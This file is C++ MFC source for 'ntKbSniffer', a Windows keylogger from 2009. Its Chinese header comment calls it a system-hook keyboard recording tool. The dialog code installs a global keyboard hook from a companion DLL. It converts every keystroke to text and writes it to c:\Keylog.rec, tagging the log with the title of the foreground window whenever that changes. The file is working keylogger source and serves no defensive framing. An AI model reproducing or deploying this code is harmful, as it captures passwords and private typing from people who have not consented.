/*
  This project was created and edited using the MFC SelfBanner AppWizard.

  Comment: 键盘记录工具－系统钩子.

  Project: ntKbSniffer.
  Author : dhyao
  Date   : 星期三, 二月 04, 2009
*/
/////////////////////////////////////////////////////////////////////

// ntKbSnifferDlg.cpp : implementation file
//

#include "stdafx.h"
#include "ntKbSniffer.h"
#include "ntKbSnifferDlg.h"
#include "..\ntKbDll\ntKbDll.h" //Include this for functions in the DLL.

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif


#define KBRECORDFILE  "c:\\Keylog.rec"
/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
		// No message handlers
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CNtKbSnifferDlg dialog

CNtKbSnifferDlg::CNtKbSnifferDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CNtKbSnifferDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CNtKbSnifferDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CNtKbSnifferDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CNtKbSnifferDlg)
	DDX_Control(pDX, IDC_BUTTON_HOOK, m_hook);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CNtKbSnifferDlg, CDialog)
	//{{AFX_MSG_MAP(CNtKbSnifferDlg)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON_EXIT, OnButtonExit)
	ON_BN_CLICKED(IDC_BUTTON_HOOK, OnButtonHook)
	ON_MESSAGE(WM_KEYSTROKE, OnKeyProcess)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CNtKbSnifferDlg message handlers

BOOL CNtKbSnifferDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Add "About..." menu item to system menu.

	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
	//初始化数据成员
	m_bHooked = false;

	m_diskfile = new CFile(KBRECORDFILE,CFile::modeCreate|CFile::modeWrite);
	strcpy(m_buffer,"");
	m_keycount = 0;
	memset(old_winname,0,sizeof(old_winname));
	memset(current_winname,0,sizeof(current_winname));

	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CNtKbSnifferDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CNtKbSnifferDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y,m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CNtKbSnifferDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

void CNtKbSnifferDlg::OnButtonExit() 
{
	// TODO: Add your control notification handler code here
	if(m_bHooked==TRUE)
	{
		RemoveHook();
		if(m_diskfile!=NULL)
		{
			m_diskfile->Flush();
			delete m_diskfile;
		}
	}

	//打开文件
	CString strPath;
	strPath.Format("notepad.exe  %s",KBRECORDFILE);
//	WinExec(strPath,SW_SHOWNORMAL);
	
	CDialog::OnCancel();
}

void CNtKbSnifferDlg::OnButtonHook() 
{
	// TODO: Add your control notification handler code here
	if(m_bHooked==TRUE)
	{
		RemoveHook();
		m_bHooked = false;
		m_hook.SetWindowText("记录键盘");		
	}
	else
	{
		InstallHook(this->GetSafeHwnd());
		m_bHooked = TRUE;
		m_hook.SetWindowText("取消记录");
	}
}

//处理击键动作
LRESULT CNtKbSnifferDlg::OnKeyProcess(WPARAM w, LPARAM l)
{
	GetKeyNameText(l,m_buffer,20);
	_strlwr(m_buffer);
	if(strlen(m_buffer)>1)
	{
		Subst("shift","<SHIFT>");
		Subst("right shift","<SHIFT>");
		Subst("tab","<TAB>");
		Subst("space"," ");
		Subst("backspace","<BACKSPACE>");
		Subst("delete","<DEL>");
		Subst("left","<LEFT>");
		Subst("down","<DOWN>");
		Subst("up","<UP>");
		Subst("right","<RIGHT>");
		Subst("num /","/");
		Subst("num *","*");
		Subst("num -","-");
		Subst("num 0","0");
		Subst("num 1","1");
		Subst("num 2","2");
		Subst("num 3","3");
		Subst("num 4","4");
		Subst("num 5","5");
		Subst("num 6","6");
		Subst("num 7","7");
		Subst("num 8","8");
		Subst("num 9","9");
		Subst("num +","+");
		Subst("num enter","<ENTER>");
		Subst("num del","<DEL>");
		Subst("esc","<ESC>");
		Subst("enter","<ENTER>");
		Subst("caps lock","<CAPSLOCK>");
		Subst("num lock","<NUMLOCK>");
		Subst("scroll lock","<SCROLLLOCK>");
		Subst("ctrl","<CTRL>");
		Subst("alt","<ALT>");
		Subst("right ctrl","<CTRL>");
		Subst("right alt","<ALT>");
		Subst("pause","<PAUSE>");
		Subst("insert","<INSERT>");
		Subst("home","<HOME>");
		Subst("end","<END>");
		Subst("page up","<PGUP>");
		Subst("page down","<PGDN>");
		Subst("f1","<F1>");
		Subst("f2","<F2>");
		Subst("f3","<F3>");
		Subst("f4","<F4>");
		Subst("f5","<F5>");
		Subst("f6","<F6>");
		Subst("f7","<F7>");
		Subst("f8","<F8>");
		Subst("f9","<F9>");
		Subst("f10","<F10>");
		Subst("f11","<F11>");
		Subst("f12","<F12>");
	}
	RecWindowName();
	m_diskfile->Write(m_buffer,strlen(m_buffer));
	if(m_keycount>50)
	{
		m_diskfile->Flush();
		m_keycount = 0;
	}
	return 0L;
}

//将键替换为自己定义的字符串以记录在文件中
void CNtKbSnifferDlg::Subst(const char *src, const char *dest)
{
	if(strcmp(m_buffer,src)==0)
		strcpy(m_buffer,dest);
}

BOOL CNtKbSnifferDlg::RecWindowName()
{
	
	//窗口句柄
	HWND _hWnd;
	 //获得最前端窗口句柄
	_hWnd=::GetForegroundWindow();
	if(_hWnd)
	{
		//保存窗口名到指定位置
		::GetWindowText(_hWnd,current_winname,sizeof(current_winname)); 
		//如果当前窗口名改变
		if(strcmp(old_winname,current_winname)!=0)
		{
			//改变旧的窗口名为最新窗口名
			strcpy(old_winname,current_winname); 
			char buf[280];
			sprintf(buf,"\r\n%s\r\n",current_winname);
			m_diskfile->Write(buf,strlen(buf));
			return TRUE;		
		}
		
	}
	
	return FALSE;
}
